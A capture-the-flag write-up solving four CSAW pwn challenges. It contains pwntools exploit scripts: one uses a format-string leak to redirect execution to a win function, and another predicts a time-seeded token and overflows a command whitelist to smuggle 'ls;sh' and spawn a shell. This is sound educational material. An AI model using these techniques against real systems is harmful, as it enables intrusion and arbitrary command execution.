
## diving-into-null

in this challenge, most of the commands were not available to read the flag so we send bash script to read `.flag`
`while read line; do echo "$line"; done < .flag`
this gives the flag
`csawctf{penguins_are_just_birds_with_tuxedos}`

## mini golfing series

there's a format string exploit which allows us to leak the address which we can use to calculate the base address of the elf. Using this we get the address of `win` on runtime and simply have to send it to the program as hex

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./golf_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("golfing.ctf.csaw.io", 9999)

    return r


def main():
    
    r = conn()
            
    # gdb.attach(r, '''
    #         gef config context.nb_lines_stack 167
    #         b *main+270
    #         ''')

    r.sendlineafter(b'name? ', b'%177$llx')

    r.recvuntil(b'hello: ')
    
    exe.address = int(r.recvline().strip(), 16) - 0x1223
    
    r.sendlineafter(b'Alright! Tell me the address you want to aim at!: ', hex(exe.symbols['win']).encode())
        
    r.interactive()

if __name__ == "__main__":
    main()
```

## Nix philosophies

in the binary decompilation we notice

```
#include <iostream>
#include <fstream>
#include <string>
#include <cstring>

int main(int argc, const char **argv, const char **envp) {
    std::string input;
    char buf[32];
    int total = 0;

    // Prompt for input
    std::cout << "Tell me what you know about *nix philosophies: ";
    std::cin >> input;

    // Calculate sum of characters in the input string (ignoring the first character)
    for (size_t i = 1; i < input.size(); ++i) {
        total += input[i];
    }

    // Read a fixed amount from some file or buffer using the total value offset
    read(total - 1603, buf, 0x20);

    // Check if the input matches a specific philosophy
    if (!strcmp("make every program a filter\n", buf)) {
        // Try to open "flag.txt"
        std::ifstream flagFile("flag.txt");
        
        if (flagFile.good()) {
            std::cout << "\nWelcome to pwning ^_^" << std::endl;
            system("/bin/cat flag.txt");
        } else {
            std::cout << "\nflag.txt: No such file or directory" << std::endl;
            std::cout << "If you're running this locally, then running it on the remote server should give you the flag!" << std::endl;
        }
    } else {
        std::cout << "You still lack knowledge about *nix, sorry" << std::endl;
    }

    return 0;
}
```

the binary takes our in put some variable `input` and stores the sum of all ascii value of the characters in out input in `total`
to get the flag the binary compares `buf` with  `make every program a filter\n`
to access buf, we need to use `read(total - 1603, buf, 0x20);` . We have to make total = 1603 for read to take our input from stdin.
this is achieved with the payload `zzzzzzzzzzzzzFE` in input. After that we  just enter `make every program a filter\n` in the read to get flag
`csawctf{-3v3ry7h1ng_15_4_f1l3}`

## VIP BLACKLIST

in this binary we get options to perform
- ls
- clear
- exit
whenever the menu gets printed it expects us to put in one of the commands or the token it randomly generates.
if we guess the generated token correctly, we get to put one more command `queue` in `allowCopy` as long as we don't already have `queue` in the command whitelist.

```
v1 = time(0LL); 
srand(v1); 
for ( i = 0LL; i <= 9; ++i ) 
	v4[i] = rand(); 
result = a1; *a1 = v4;
```

we can easily generate the same token  because of using time(0) as the seed

after we get in `allowCopy()`

```
 v5 = read(0, buf, 0x20uLL);
  if ( v5 < 0 )
  {
    perror("Error reading from stdin");
    exit(1);
  }
  buf[strcspn(buf, "\n")] = 0;
  for ( i = 0; i < strlen("queue") + 1; ++i )
  {
    if ( buf[i] != s2[i] )
      kickOut();
  }
```

as long as our input in `local_48` starts with queue we can pass this check
```
  strcpy(v6, "clear");
  v7 = 'tixe';
  v8 = 0;
  v9 = 'sl';
  for ( j = 3; j >= 0; --j )
    strcpy(&whitelist[6 * j], &whitelist[6 * j - 6]);
  for ( k = 0; k < v5 - 1; ++k )
    whitelist[k] = buf[k];
  if ( !(unsigned int)safety(v6) )
    kickOut();
```
in this portion we arrange the whitelist global variable in the order:
- queue
- clear
- exit
- ls
after that we call `safety()` to check  the order
now this can be bypassed too as long we maintain this order and put or choice of command after that in proper alignment

like `b'queue\x00clear\x00exit\x00\x00ls;sh\x00'`

back inside main
```
for ( i = 0; i <= 3; ++i )
    {
      if ( !strcmp(s, &whitelist[6 * i]) )
      {
        v2 = 1;
        break;
      }
    }
```

-  `whitelist[0]` : `queue\x00`
- `whitelist[6]` : `clear\x00`
- `whitelist[12]` : `exit\x00\x00`
- `whitellist[18]` : ` ls;sh\x00
now we send `ls;sh` as the next command and then get flag

`csawctf{4r3_y0u_0n_7h3_b14ckl157?}`

```
#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL

exe = ELF("./vip_blacklist")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

libc_funcs = CDLL(libc.path)

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("vip-blacklist.ctf.csaw.io", 9999)

    return r


def main():
    r = conn()
    # gdb.attach(r, '''
    #            b *allowCopy+0x195
    #            b *allowCopy+0x1c9
    #            b *safety+0x24
    #            b *safety+0xcd
    #            c
    #            ''')
    
    libc_funcs.srand(libc_funcs.time(None))
    
    output = b''
    for _ in range(10) : output += (libc_funcs.rand() & 0xff).to_bytes(1, 'little')

    
    r.sendline(output)
    
    
    r.sendafter(b'enter.', b'queue\x00clear\x00exit\x00\x00ls;sh\x00')

    r.interactive()


if __name__ == "__main__":
    main()
```
